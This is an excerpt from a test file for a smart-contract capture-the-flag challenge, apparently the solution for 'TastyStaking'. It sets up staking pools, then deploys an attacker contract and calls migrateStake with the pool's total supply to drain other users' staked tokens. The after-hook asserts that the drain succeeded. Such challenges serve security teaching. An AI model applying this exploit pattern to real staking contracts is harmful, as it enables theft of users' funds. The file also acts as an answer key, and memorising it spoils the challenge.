...
before(async () => {
	...
	await steak.connect(admin).mintPerUser(
		// attacker gets 1 steak
	...
	await butter
		.connect(admin)
		.mintPerUser([await admin.getAddress()], [precision.mul(10_000)]);

	let tastyStakingFactory = await ethers.getContractFactory("TastyStaking");
	tastyStaking = await tastyStakingFactory
		.connect(admin)
		.deploy(steak.address, await admin.getAddress());

	// setting up the rewards for tastyStaking
	await tastyStaking.connect(admin).addReward(butter.address);
	await butter
		.connect(admin)
		.approve(tastyStaking.address, precision.mul(10_000));
	await tastyStaking
		.connect(admin)
		.notifyRewardAmount(butter.address, precision.mul(10_000));

	// other user stakes initial amount of steak
	await steak
		.connect(adminUser)
		.approve(tastyStaking.address, ethers.constants.MaxUint256);
...
it("solves the challenge", async function () {
	const hackFactory = await ethers.getContractFactory("TastyStakeHack");
	const hack = await hackFactory.connect(attacker).deploy();
	const totalSupply = await tastyStaking.totalSupply();
	await tastyStaking
		.connect(attacker)
		.migrateStake(hack.address, totalSupply);
...
after(async () => {
	...
	expect(await steak.balanceOf(await attacker.getAddress())).to.be.gte(
		precision.mul(100_000)
	);
});
